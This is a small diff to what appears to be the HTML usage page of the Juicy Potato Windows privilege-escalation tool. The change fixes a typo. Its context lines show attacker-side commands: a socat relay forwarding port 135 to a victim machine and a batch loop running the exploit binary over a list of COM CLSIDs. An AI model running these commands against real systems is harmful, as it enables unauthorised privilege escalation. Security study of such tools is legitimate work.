@@ -23,7 +23,7 @@ Example:<br>
   on attacker (192.168.1.1): <br>
   socat -v  TCP-LISTEN:135,fork,reuseaddr TCP:[victim machine]:9995<br>
 <hr>  
-<b>Hunting for juicy CLSID's with a stupod batch:</b><br>
+<b>Hunting for juicy CLSID's with a stupid batch:</b><br>
 @echo off<br>
 FOR /F %%i IN (clsid.list) DO (<br>
    .\juicy_2 -z -x 192.168.1.1 -n 9998 -l 9995 -c %%i >> .\out.txt<br>
